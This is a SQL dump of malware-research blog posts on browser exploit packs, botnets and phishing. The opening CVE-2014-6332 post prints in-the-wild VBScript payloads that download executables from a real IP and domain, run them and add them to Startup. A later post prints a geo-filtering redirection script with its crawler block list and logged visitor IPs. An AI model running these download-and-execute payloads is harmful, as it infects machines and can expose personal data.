shell.run \"cmd.exe /q /c del C:\\RECYCLER\\361.exe\",0  \n shell.run \"cmd.exe /q /c copy c:\\windows\\system32\\ftp.exe C:\\RECYCLER\\fp.exe\",0  \n shell.run \"cmd.exe /q /c copy c:\\windows\\system32\\ftp.exe c:\\windows\\system32\\fp.exe\",0  \n shell.run \"cmd.exe /q /c copy %systemroot%\\system32\\ftp.exe %systemroot%\\system32\\fp.exe\",0  \n shell.run \"cmd.exe /q /c echo open 104.152.215.90>C:\\RECYCLER\\fp.dw&echo do1>>C:\\RECYCLER\\fp.dw&echo 123456>>C:\\RECYCLER\\fp.dw&echo bin >>C:\\RECYCLER\\fp.dw&echo get a1.exe C:\\RECYCLER\\a1.exe>>C:\\RECYCLER\\fp.dw&echo get arp2.exe C:\\RECYCLER\\arp2.exe>>C:\\RECYCLER\\fp.dw&echo get fa2.exe C:\\RECYCLER\\fa2.exe>>C:\\RECYCLER\\fp.dw&echo get cgud.exe C:\\RECYCLER\\cgud.exe>>C:\\RECYCLER\\fp.dw&echo bye >>C:\\RECYCLER\\fp.dw&ping 127.0.0.1 -n 10&FP -s:C:\\RECYCLER\\fp.dw&del C:\\RECYCLER\\fp.dw /q&copy C:\\RECYCLER\\fa2.exe C:\\docume~1\\alluse~1\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌÐò\\Æô¶¯\\fa2.exe&copy C:\\RECYCLER\\arp2.exe C:\\docume~1\\alluse~1\\¡¸¿ªÊ¼¡¹²Ëµ¥\\³ÌÐò\\Æô¶¯\\arp2.exe&start C:\\RECYCLER\\fa2.exe&start C:\\RECYCLER\\a1.exe&start C:\\RECYCLER\\cgud.exe&C:\\RECYCLER\\arp2.exe&del C:\\RECYCLER\\fp.exe\",0  \n end function  \n </script>  \n\n\nAnother variant of exploit payload is shown below which highlights that how exactly HTTP requests are issued using AJAX and MSXML2 for downloading malware (http://natmasla.ru/ath/sploit/natmasla.exe, this link might be active) directly. VBScript calls are then used to execute the  malware.\n\n \n\n<script language=\"VBScript\">  \n function runmumaa()   \n On Error Resume Next  \n set shell=createobject(\"Shell.Application\")  \n shell.ShellExecute \"cmd.exe\", \"/c CD %TEMP%&\n@echo \nSet objXMLHTTP=CreateObject(\"\"MSXML2.XMLHTTP\"\")>wUnlRLZR.vbs&\n@echo objXMLHTTP.open \"\"GET\"\",\"\"http://natmasla.ru/ath/sploit/natmasla.exe\"\",false>>wUnlRLZR.vbs&\n@echo \nobjXMLHTTP.send()>>wUnlRLZR.vbs&\n@echo If objXMLHTTP.Status=200 Then>>wUnlRLZR.vbs&\n@echo Set objADOStream=CreateObject(\"\"ADODB.Stream\"\")>>wUnlRLZR.vbs&\n@echo objADOStream.Open>>wUnlRLZR.vbs&\n@echo objADOStream.Type=1 >>wUnlRLZR.vbs&\n@echo objADOStream.Write objXMLHTTP.ResponseBody>>wUnlRLZR.vbs&\n@echo objADOStream.Position=0 >>wUnlRLZR.vbs&\n@echo objADOStream.SaveToFile \"\"%TEMP%\\natmasla.exe\"\">>wUnlRLZR.vbs&\n@echo objADOStream.Close>>wUnlRLZR.vbs&\n@echo Set objADOStream=Nothing>>wUnlRLZR.vbs&\n@echo End if>>wUnlRLZR.vbs&\n@echo Set objXMLHTTP=Nothing>>wUnlRLZR.vbs&\n@echo Set objShell=CreateObject(\"\"WScript.Shell\"\")>>wUnlRLZR.vbs&\n@echo objShell.Exec(\"\"%TEMP%\\natmasla.exe\"\")>>wUnlRLZR.vbs&cscript.exe %TEMP%\\wUnlRLZR.vbs&del %TEMP%\\wUnlRLZR.vbs\", \"\", \"open\", 0  \n end function  \n </script>  \n\n\nPublic available exploits can be tweaked easily as discussed in the case study above. It is really interesting to analyze the types of payloads and exploits used in the wild for exploiting vulnerabilities in the browsers.\n\nInference: Openly available exploits are restructured by the attackers and used in BEPs to trigger infections.', 'Browser Exploit Pack, CVE-2014-6332, Cybercrime, Malware', 'https://secniche.blogspot.com/2015/03/a-real-world-story-of-cve-2014-6332-rce.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, '\nA Case Study of Geo-location Filtering and Dedicated Malware Infections !\n', 'Aditya K Sood', '2015-02-22T19:43:00-08:00', 'It is a wide-known fact that the majority of infectious code (iframe redirecting to browser exploit packs) is hosted on free domains or compromised websites that are sold in the underground community. In my earlier presentation at Virus Bulletin Conference (HERE), I discussed about the IP Address Logging Detection Trick (IPLDT) which basically allows the attackers to restrict the spreading of malware to a dedicated audience on the Internet. For more about BEPs, read the previous research papers:\n\n\n\nStyx Exploit Pack - http://secniche.org/released/VB_Styx_Exploit_Pack.pdf\nSweet Orange Exploit Pack - http://secniche.org/released/VB_SWEET_ORANGE_EXP_AKS_RB_RJE.pdf\n\n\nA simple work flow is discussed below:\n\n\nUser visits the website serving infectious code.\nInfected website triggers the custom code hosted by attacker to check for the following:\n\nGeo-location of the IP address: If Geo-location of the IP address of the end-user is found to be mapped to specific locations in the configuration file, the user\'s browser is redirected to BEP for exploitation.\nVerifying whether the exploit-code has been served to this IP or not: If the database shows that IP has been served already, IP address of the end-user is filtered and BEP URL is not served. \n\nWhen the user browser lands on the BEP URL, a specific vulnerability in the browser (built-in components or plug-ins) is exploited to download malware.\n\n\n\n\nIn addition, filters are also added for various automated spiders to restrict the access to bots (spiders) to prevent the appearance of malicious website or links in the search results. Recently, I was analyzing a malicious website that was serving infectious code and redirects the user\'s browser to BEP to download malware by exploiting specific vulnerability. However, the name of the exploit kit is not  known. This analysis is more concentrated on the compromised website that performs redirection of the user\'s browser to the BEP.\n\nA code snippet extracted from the infected webite is presented below. It clearly shows that the user-agent  and  IP Geo-location(\"CH\" = Switzerland, \"DE\" = Germany) components are used for setting filters on the incoming HTTP traffic. Additionally, two files are generated for building databases for the IP addresses that are either successful (sbase.txt) or unsuccessful (sbase_bad.txt) in getting the direct link of the BEP URL from the infected website.\n\n\n\n <?php  \n error_reporting(0); ini_set(\'display_errors\',0);  \n function is_bot($myuagent, $myip) {  \n      $uagents = file(\'uagents.txt\',FILE_IGNORE_NEW_LINES);  \n      $ips = file(\'ips.txt\',FILE_IGNORE_NEW_LINES);  \n      foreach ($uagents as $exp) {  \n           if (preg_match(\'/\'.$exp.\'/i\',$myuagent)) {  \n                return true;  \n           }  \n      }  \n      foreach ($ips as $exp) {  \n           if (preg_match(\'/\'.$exp.\'/\',$myip)) {  \n                return true;  \n           }  \n      }  \n      return false;  \n }  \n   $countries = \"CH;DE\";  \n   // no?aie?ea n nieiaoii  \n   $good_link = \"./banner.php\";  \n   // eaaay no?aie?ea  \n   $bad_link = \"./blabla.php\";  \n   //  \n   $ip = $_SERVER[\'REMOTE_ADDR\'];  \n   $ua = $_SERVER[\'HTTP_USER_AGENT\'];  \n   $file = fopen(\"./sbase.txt\",\"a+\");  \n   $file2 = fopen(\"./sbase_bad.txt\",\"a+\");  \n   $already_showed = FALSE;  \n   while (!feof($file)) {  \n     $buffer = fgets($file);  \n     $ip2 = $ip.\"\\r\\n\";  \n     if(strcmp($buffer,$ip2)==0) $already_showed = TRUE;  \n   }  \n   if (is_bot($_REQUEST[\'useragent\'], $ip)) $already_showed = TRUE;  \n   if($already_showed) {  \n     include($bad_link);  \n   } else {  \n     require_once(\'./geoip/geoip.inc\');  \n     $gi = geoip_open(\"./geoip/GeoIP.dat\",GEOIP_STANDARD);  \n     $ccode = explode(\";\",$countries);  \n     $show = FALSE;  \n     foreach($ccode as $value) {  \n       if(geoip_country_code_by_addr($gi,$ip) == $value && preg_match(\'/(msie|opera|firef)/i\', $ua)) {  \n         $show = TRUE;  \n         fwrite($file,$ip.\"\\r\\n\");  \n       }  \n     }  \n     geoip_close($gi);  \n     if($show) {  \n       include($good_link);  \n     } else {  \n          fwrite($file2,$ip.\"|\".$ua.\"\\r\\n\");  \n       include($bad_link);  \n     }  \n   }  \n   fclose($file);  \n ?>  \n\nOn checking the stats of the two files, following stats were gathered:\n\nApproximately 5881 unique IP addresses (users\' browsers) were successfully redirected to the BEP.\nApproximately 15737 unique IP addresses (users\' browsers)  were restricted from visiting to the BEP.\n\n\nThe list of banned user-agents are shown below:\n\n\n Ask\\s*Jeeves  \n HP\\s*Web\\s*PrintSmart  \n HTTrack  \n IDBot  \n Indy\\s*Library#  \n ListChecker  \n MSIECrawler  \n NetCache  \n Nutch  \n RPT-HTTPClient  \n rulinki\\.ru  \n Twiceler  \n WebAlta  \n Webster\\s*Pro  \n www\\.cys\\.ru  \n Wysigot  \n Yahoo!\\s*Slurp  \n Yeti  \n Accoona  \n CazoodleBot  \n CFNetwork  \n ConveraCrawlerDISCo  \n Download\\s*Master  \n FAST\\s*MetaWeb\\s*Crawler  \n Flexum\\s*spider  \n Gigabot  \n HTMLParser  \n ia_archiver  \n ichiro  \n IRLbot  \n Java  \n km\\.ru\\s*bot  \n kmSearchBot  \n libwww-perl  \n Lupa\\.ru  \n LWP::Simple  \n lwp-trivial  \n Missigua  \n MJ12bot  \n msnbot  \n msnbot-media  \n Offline\\s*Explorer  \n OmniExplorer_Bot  \n PEAR  \n psbot  \n Python  \n rulinki\\.ru  \n SMILE  \n Speedy  \n Teleport\\s*Pro  \n TurtleScanner  \n User-Agent  \n voyager  \n Webalta  \n WebCopier  \n WebData  \n WebZIP  \n Wget  \n Yandex  \n Yanga  \n Yeti  \n msnbot  \n spider  \n yahoo  \n jeeves  \n google  \n altavista  \n scooter  \n av\\s*fetch  \n asterias  \n spiderthread revision  \n sqworm  \n ask  \n lycos.spider  \n infoseek sidewinder  \n ultraseek  \n polybot  \n webcrawler  \n robozill  \n gulliver  \n architextspider  \n yahoo!\\s*slurp  \n charlotte  \n ngb  \n\n\n\nA number of IP addresses with respective user-agent strings are presented below that were not allowed to load BEP URL in the browser for exploitation.\n\n 77.120.162.20|Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.16  \n 77.56.219.66|Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko  \n 194.124.140.39|Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  \n 41.249.252.199|Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko  \n 213.14.101.210|Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36  \n 46.126.65.93|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko  \n 194.179.92.135|Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0  \n 213.14.101.210|Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36  \n 93.199.31.78|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; tb-webde/2.6.0; rv:11.0) like Gecko  \n 77.56.219.66|Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko  \n 188.63.105.11|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko  \n 77.56.219.66|Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko  \n 84.253.30.110|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko  \n 194.179.92.135|Mozilla/4.0 (compatible;)  \n 189.19.165.228|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36  \n 66.102.6.183|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.68 Safari/537.36  \n 66.249.93.223|Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14  \n 81.62.35.97|Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko  \n 195.78.246.18|Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36  \n\n\nInference: BEPs extensively use IPLDT to manage the infections and make the malicious code to be served to dedicated countries.', 'Browser Exploit Pack, Iframe injector, Malware', 'https://secniche.blogspot.com/2015/02/a-case-study-of-geo-location-filtering.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, '\nVirus Bulletin Paper - Prosecting the Citadel botnet !\n', 'Aditya K Sood', '2015-02-08T10:54:00-08:00', 'Virus Bulletin published earlier our research on Citadel. Check the links:\n\nProsecting the Citadel botnet - revealing the dominance of the Zeus descendent: part one : https://www.virusbtn.com/virusbulletin/archive/2014/09/vb201409-Citadel-1 \nProsecting the Citadel botnet - revealing the dominance of the Zeus descendent: part two : https://www.virusbtn.com/virusbulletin/archive/2014/09/vb201409-Citadel-2 \n\n\n Full PDF paper : https://www.virusbtn.com/pdf/magazine/2014/vb201409-Citadel.pdf', 'Botnets, Citadel, Cybercrime, Malware', 'https://secniche.blogspot.com/2015/02/virus-bulletin-paper-prosecting-citadel.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, '\nBlackHat 2014 - Botnet C&C Panel Talk\n', 'Aditya K Sood', '2014-08-24T08:41:00-07:00', 'Whitepaper: http://secniche.org/blackhat-2014/blackhat_2014_briefings_whitepaper_exp_cc_flaws_adityaks.pdf', 'blackhat, Botnets, Command and Control, Malware', 'https://secniche.blogspot.com/2014/08/blackhat-2014-botnet-c-panel-talk.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, '\nTargeted Cyber Attacks Book - Syngress !\n', 'Aditya K Sood', '2014-04-15T21:24:00-07:00', 'Update: A very insightful review of the book published in Network Security.\n\n  \n\n Network Security : Book Review : Targeted Cyber Attacks : Aditya K Sood \n\n\n\n\nI started sketching this book about a year ago when I was invited by Syngress for this project based on my previous work on crimeware research. Thanks to the Syngress and Elsevier team for this step. Due to my ongoing job and commitments,  the project got delayed but eventually the book is about to be published on 18th April. The first edition of the book is dedicated to the readers who are interested in understanding the artifacts of targeted cyber-attacks and associated components. Personally, I would like to thank all the researchers and journalists who reviewed the book and provided positive feedback.\n\nIntroduction: Cyber-crime increasingly impacts both the online and offline world, and targeted attacks play a significant role in disrupting services in both. Targeted attacks are those that are aimed at a particular individual, group, or type of site or service. Unlike worms and viruses that usually attack indiscriminately, targeted attacks involve intelligence-gathering and planning to a degree that drastically changes its profile.\nIndividuals, corporations, and even governments are facing new threats from targeted attacks. Targeted Cyber Attacks examines real-world examples of directed attacks and provides insight into what techniques and resources are used to stage these attacks so that you can counter them more effectively.\n\nThe book is available to be ordered at following places:\n\nAmazon: http://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits/dp/0128006048\nKindle Edition: http://www.amazon.com/Targeted-Cyber-Attacks-Multi-staged-Exploits-ebook/dp/B00JRVB3UY\nElsevier: http://store.elsevier.com/Targeted-Cyber-Attacks/Aditya-Sood/isbn-9780128006047/\nBarnes and Noble: http://www.barnesandnoble.com/w/targeted-cyber-attacks-aditya-sood/1118602703?ean=9780128006047\n\nNote: Elsevier Store will offer electronic versions that are readable on Kindles in PDF and MOBI format.\n\nEnjoy !', 'APTs, Botnets, crimeware, Cybercrime, Targeted Attacks', 'https://secniche.blogspot.com/2014/04/targeted-cyber-attacks-book-syngress.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, '\nGmail Phishing Attack - Why the Anti-spam Solutions Fail to Trigger ?\n', 'Aditya K Sood', '2014-02-27T17:12:00-08:00', 'Update: 5th March, 2014\n\n\n\nNote: I am concerned because it got delivered to my personal gmail inbox -:)\n\n\n\nIt looks like the phishing attack discussed earlier (a week ago) on gmail users is still underway. Although, the attack is public now, the endpoint security solutions deployed by Google still fails to mark the emails as phished. The latest snapshot of this attack is presented below:\n\n\n\nLinks: \n\n\n\nhxxp://croydon.com.br/phpthumb/serv/serv/Login.htm \nhxxp://croydon.com.br/phpthumb/serv/serv/badu.php\n\n\n\n\n\n\n\n\n\n\n\n\n\nThe host has a malice history though : https://www.virustotal.com/en/ip-address/187.17.98.129/information/\n\n\n\nIt is not a reliable way to depend heavily on safe-browsing all the time for blacklisting the phishing websites rather the prevention has to be triggered at the time of origin. Let\'s see how long this continues. \n\n\n\n-------------------------------\n\n\n\nA recent targeted phishing attack has been launched against gmail.com users. Interestingly, the email slipped through Google end point security solution which fails to detect the spam email and served it properly to the user\'s inbox.\n\n\n\n\n\n\nVisiting the link results in the following webpage showing the same layout as of Gmail. \n\n\n\n\n\n\n\nMalicious Check: \n\n\n\nThe domain resolves to an IP address which has a history of being potential malice: https://www.virustotal.com/en/ip-address/79.170.44.127/information/. The virtual hosting server has been used for compromised WordPress websites.\n\n\n\nOverall, basic steps:\n\n\n\nThe user is redirected and served with a gmail.com webpage here: hxxp://www.nusurgix.com/virtusite/phpthumb/serv/Login.htm\nThe form submission sends all the POST data to: hxxp://www.nusurgix.com/virtusite/phpthumb/serv/badu.php\nThe user redirects successfully to legitimate gmail.com webpage: hxxps://accounts.google.com/\n\n\n\nThe website is hosted on a CMS hosting server as shown below:\n\n\n\n\n\n\n\nOverall, it might not be that sophisticated attack, but a few inferences:\n\n\nSmart user would have detected that this is a trick even it is delivered to inbox.\nBig issue, the anti-spam solutions in Google\'s network fails to detect it and mark it as phished. \nThere might be a possibility that a few users would have fallen to this trick but we cannot be sure.\nThe attacker used a compromised network infrastructure to execute this attack. A healthcare provider hosting account is compromised.\nThis type of attack if remains active for only few minutes could have already garnered a good set of accounts.\n\n\nDo not fall for this trap !', 'credentials stealing, Gmail phishing attack, Malware', 'https://secniche.blogspot.com/2014/02/gmail-phishing-attack-why-anti-spam.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, '\nVirus Bulletin - NiFramer Iframer Injector - CPanel\n', 'Aditya K Sood', '2014-01-12T17:18:00-08:00', 'A couple of months earlier, we released a paper on the design of NiFramer, a bash tool to automate the Iframe injections on the compromised servers. It has been used widely by attackers. However, in coming time, we will be covering different variants of automated Iframe injection tools.\n\n\n\n  \n\n\n\n\nYou can download the paper at: http://secniche.org/released/VB_CPANEL_IFRAME_INJECT.pdf', 'CPanel Infection, Iframe injector, Malware, Server Infections', 'https://secniche.blogspot.com/2014/01/virus-bulletin-niframer-iframer.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, '\nVirus Bulletin : Analysis of Styx Exploit Pack \n', 'Aditya K Sood', '2013-11-05T19:32:00-08:00', 'We released a paper in Virus Bulletin Magazine on the design analysis of Styx exploit pack.\n\n\" In this paper, we discuss the details and design of the Styx exploit pack. According to the dictionary, Styx is a river in the underworld, over which Charon ferried the souls of the dead. According to the Styx service provider website, ‘Styx is a river in Greek mythology that formed the boundary between earth and the underworld... It circles the underworld nine times.’ So it seems that the origin of the name is as rigorous as the exploit pack itself.\"\n\nDownload the paper from here: http://secniche.org/released/VB_Styx_Exploit_Pack.pdf', 'Browser Exploit Pack, Malware, Styx Exploit Pack', 'https://secniche.blogspot.com/2013/11/virus-bulletin-analysis-of-styx-exploit.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, '\nCrossTalk Paper - The Art of Cyber Bank Robbery !\n', 'Aditya K Sood', '2013-09-13T13:53:00-07:00', 'We released a new paper to provide insights into Cyber bank robbery model opted by cyber criminals.\n\n\n\n\n  \n CrossTalk - The Art of Cyber Bank Robbery - Stealing your Money Through Insidious Attacks !    \n\n\nDownload paper : http://www.crosstalkonline.org/storage/issue-archives/2013/201309/201309-Sood.pdf', 'bank frauds, bank thefts, Botnets, crimeware, cybecrime, online banking security', 'https://secniche.blogspot.com/2013/09/crosstalk-paper-art-of-cyber-bank.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, '\nToorCon 14 Slides : Malandroid : The Crux of Android Infections\n', 'Aditya K Sood', '2013-06-10T16:58:00-07:00', 'Just uploaded the deck of slides used in ha talk that I presented at ToorCon 14 Security conference in San Diego.\n\n\n  \n ToorCon 14 : Malandroid : The Crux of Android Infections \n\n\nAbstract: The Android platform has been plagued by malware for the past several years. Despite all attempts to detect and mitigate malicious applications on Android, malware is still flying under our radar and getting on our devices and causing millions of users financial and data loss every year. Additionally, the malware analysis community is at a large disagreement on how Android malware should be classified. In this talk, we’ll dive into the tactics, tools and procedures used by Android malware today, including several case studies of exceptional malware samples. By analyzing real code used by malware in the wild, we’ll be able to show the advancements in Android malware from a design perspective.\n\n\n\nEnjoy !', 'Android hacking, android malware, android security, mobile exploitation, mobile hacking', 'https://secniche.blogspot.com/2013/06/toorcon-14-slides-malandroid-crux-of.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, '\nContrarisk Security Podcast: A look into Socioware !\n', 'Aditya K Sood', '2013-05-20T03:57:00-07:00', 'I recently did a podcast on the Socioware with Steve from Contrarisk.\n\n\"Microsoft recently warned about Man in the Browser (MitB) malware exploiting Facebook sessions. When a user is infected – often by drive-by downloads on infected or malicious sites – the malware uses authenticated sessions on Facebook to post messages, ‘like’ pages and get up to general mischief.\"\n\nListen to the podcast here: http://contrarisk.com/2013/05/19/csp-0011/', 'Botnets, Contrarisk, Facebook infections, Podcast, Social Network Malware, Socioware, Twitter infect', 'https://secniche.blogspot.com/2013/05/contrarisk-security-podcast-look-into.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, '\nMalware Retrospective - Infected Chinese Servers Deploy Metasploit Exploits\n', 'Aditya K Sood', '2013-03-26T20:13:00-07:00', 'It\'s been a time that our team blogged about malware and other interesting information. Today, we got some time to talk about one of the case that we analyzed while testing a few tools of our own. We prefer to construct custom scripts and tools to automate the process of web malware analysis. Recently, we tested our tool, a simple parser which fetches the scripts, iframes, embed tags present in the remote web pages for faster analysis. We came across a set of malicious domains that were serving an exploit which used JavaScript heap spraying technique to execute payload using drive-by download attack. Well, that\'s a common technique of silent browser exploitation. But, what was not common is the issue that is discussed below.\n\nThe malware domain was hosting an exploit for MS12-043 Microsoft XML Core Services MSXML Uninitialized Memory Corruption. More details can be read here: MS12-043. Without any surprise, the IP address of that domain belonged to China as shown below:\n\n\n\n\n\nOur surprise did not end here. As the exploit of this vulnerability was released last year, it raised our interest to check how the exploit code is structured.  When the exploit code was traced, it was nothing more than a sweet shock. The Chinese domain used the same exploit code hosted on the Metasploit repository for the concerned vulnerability. Now the question: Is it possible that Chinese malware authors simply deploy Metasploit exploits for easy infection process? It could be. Who knows whether the domain was infected by Chinese or it belonged to others. In addition, it is hard to say who hosted that malware but clearly, the servers were present in China.\n\nThe exploit for this vulnerability can be found in Metasploit here: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/msxml_get_definition_code_exec.rb.\n\nA simple check on the one of the code snippet used in the malware domain and legitimate Metasploit repository is shown below:\n\n\n\n\n   \n\nThe exploit code was used in conjunction with the JS code hosted here: http://js.users.51.la/15240615.js.\n\n\n\n\n\nThis code dynamically generates the information about the visitor and creates log details for statistical purposes.\n\nWe remember that a few traces have been detected earlier where Phoenix exploit kit used the one of  the same exploit present in the Metasploit. Refer: Gangsterware. \n\nThe conclusive points are:\n\n\nMetasploit provides neat exploits which are easy to deploy and use.\nThe evidence shows that malware authors are using Metasploit exploits.\n\n\nWell, Reality bites !', 'Browser Exploit Packs, Chinese Malware, Metasploit, Microsoft XML Core Services, MS12-043, Targeted ', 'https://secniche.blogspot.com/2013/03/malware-retrospective-infected-chinese.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (16, '\nVB Magazine - A Look into Sweet Orange and Propack Exploit Pack\n', 'Aditya K Sood', '2013-03-05T08:28:00-08:00', 'We have just released our thoughts on \"Sweet Orange\" and \"ProPack\" exploit packs in VB magazine this month.\n\n\"Blackhole has been the major player in the exploit kit market for a while now, but the Sweet Orange and ProPack kits have recently entered the market and are rapidly gaining in popularity. Aditya Sood and colleagues take a look at advancements in the design of the new kits on the block.\"\n\nRefer: http://www.virusbtn.com/virusbulletin/archive/2013/03/vb201303-SweetOrange-ProPack\n\nEnjoy !', 'Browser Exploit Packs, ProPack, Sweet Orange Exploit Pack, Virus Bulletin', 'https://secniche.blogspot.com/2013/03/vb-magazine-look-into-sweet-orange-and.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (17, '\nIEEE Security and Privacy Magazine - Targeted Cyber Attacks Paper\n', 'Aditya K Sood', '2013-02-13T10:09:00-08:00', 'Our paper on targeted attacks is out in IEEE Security and Privacy Magazine.\n\n\"Targeted cyber attacks play an increasingly significant role in disrupting the online social and economic model, not to mention the threat they pose to nation-states. A variety of components and techniques come together to bring about such attacks\"\n\nRefer here: http://www.computer.org/csdl/mags/sp/2013/01/msp2013010054-abs.html\n\nEnjoy !', 'Advanced Persistent Threats, Cybercrime, Cyberwar, IEEE Security and Privacy, Targeted Atatcks', 'https://secniche.blogspot.com/2013/02/ieee-security-and-privacy-magazine.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, '\nElsevier IJCIP - Crimeware-as-a-service – A survey of commoditized crimeware in the underground mar', 'Aditya K Sood', '2013-02-06T20:43:00-08:00', 'Our paper on Crimeware-as-a-Service (CaaS) has been accepted for publication in Elsevier\'s Journal of Critical Infrastructure Protection and is available at http://www.sciencedirect.com/science/article/pii/S1874548213000036.\n\nAbstract: Crimeware-as-a-Service (CaaS) has become a prominent component of the underground economy. CaaS provides a new dimension to cyber crime by making it more organized, automated, and accessible to criminals with limited technical skills. This paper dissects CaaS and explains the essence of the underground economy that has grown around it. The paper also describes the various crimeware services that are provided in the underground market.', 'Botnets, Browser Exploit Packs, Cybercrime, Pay-per-install, Underground Enterprise', 'https://secniche.blogspot.com/2013/02/elsevier-ijcip-crimeware-as-service.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, '\nIEEE  Internet Computing - Dissecting the State of Underground Enterprise\n', 'Aditya K Sood', '2013-01-30T08:53:00-08:00', 'Our paper on \"Dissecting the State of Underground Enterprise\" is finally out in IEEE Internet Computing.\n\nAbstract: \"Cybercrime\'s tentacles reach deeply\ninto the Internet. A complete, underground criminal economy has developed that\nlets malicious actors steal money through the Web. The authors detail this\nenterprise, showing how information, expertise, and money flow through it.\nUnderstanding the underground economy\'s structure is critical for fighting\nit.\"\n\n\n\nIts available here: http://www.computer.org/csdl/mags/ic/2013/01/mic2013010060-abs.html.', 'Cybercrime, IEEE Internet Computing, Underground Enterprise', 'https://secniche.blogspot.com/2013/01/ieee-internet-computing-dissecting.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, '\nHack In The Box (HitB) Magazine : A Journey of Learning and Sharing\n', 'Aditya K Sood', '2013-01-27T16:58:00-08:00', 'I finally get some time to talk my ( and other team members) journey as a contributor and author for Hack-in-the-Box (HitB) magazine. At this point, HitB ezine has completed more than two years. It\'s been a great time working with the HitB crew especially Zarul and Dhillon. In addition, Mateusz “j00ru” Jurczyk\nGynvael Coldwind is also contributing a lot. I have been writing for this magazine right from the first edition. It has been a great time of sharing and learning in the last two years. I want to talk about the content that I have written in the last nine editions with a support from my different colleagues.\n\nEdition 1: (Paper) - Malware Obfuscation: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-001.pdf - The first edition was released in January 2010. In this edition, I wrote a paper with Wayne Huang of Armorize on malware obfuscation tactics with an additional support from Fyodor Yarochkin. We discussed several malware obfuscation tactics and how to deobfuscate them manually.\n\nEdition 2: (Paper) - Open Redirect Wreck Off - Web Traffic Forwards: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-002.pdf - The second edition was released in April 2012. In this edition, I presented the complete details of traffic redirection in web applications and websites using real time code snippets collected during open research.\n\nEdition 3: (Paper) - Chinese Malware Factory - Paradox of MS Office Based Malware: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-003.pdf - The third edition came out in July 2010. In this edition, I wrote about my research on MS office based Chinese malware that uses word, excel, etc. files to spread malicious code by exploiting inherent vulnerabilities in the requisite software component.    \n\nEdition 4: (Paper) - Notorious Data-center Support Systems: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-004.pdf - The fourth edition came out in October 2010. In this edition. I wrote a collaborative paper with my colleague Rohit Bansal on vulnerabilities present in the support center web applications that can directly result in gaining access to different virtual hosts.\n\nEdition 5: (Paper) - Exploiting Web Virtual Hosting - Malware Infections: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-005.pdf - The fifth edition was released in February 2011. In this paper, I wrote a paper collaboratively with my colleague Rohit Bansal and my adviser Dr. Enbody and presented about the techniques of infecting virtual hosts present on the same host.\n\nEdition 6: (Paper) - Botnet Resistant Coding: http://magazine.hackinthebox.org/issues/HITB-Ezine-Issue-006.pdf - The sixth edition came out in June 2011. I released a paper with my colleagues Peter Greko, Fabian and my adviser Dr. Enbody to present on the concept of botnet 